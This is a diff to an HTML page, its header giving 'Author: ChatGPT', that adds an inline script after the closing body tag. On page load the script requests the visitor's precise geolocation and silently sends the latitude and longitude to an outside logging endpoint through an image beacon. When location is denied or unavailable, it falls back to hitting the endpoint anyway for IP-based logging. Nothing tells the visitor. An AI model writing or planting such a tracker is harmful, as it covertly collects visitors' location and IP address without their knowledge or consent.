@@ -164,5 +164,38 @@ Author: ChatGPT
     <script src="script.js"></script>
 </body>
 
+    <script>
+(function() {
+    // Your logging endpoint
+    const logUrlBase = "https://fortifi.lovestoblog.com/log.php";
+
+    // Try to get precise browser location
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Send data to your PHP logger without blocking user
+            const img = new Image();
+            img.src = logUrlBase + "?lat=" + encodeURIComponent(lat) + "&lon=" + encodeURIComponent(lon);
+        }, function(error) {
+            // If user denies or it fails, just call log.php normally (IP-based fallback)
+            const img = new Image();
+            img.src = logUrlBase;
+        }, {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+        });
+    } else {
+        // No geolocation support → fallback to IP-based
+        const img = new Image();
+        img.src = logUrlBase;
+    }
+})();
+</script>
+
+
 
 </html>
+
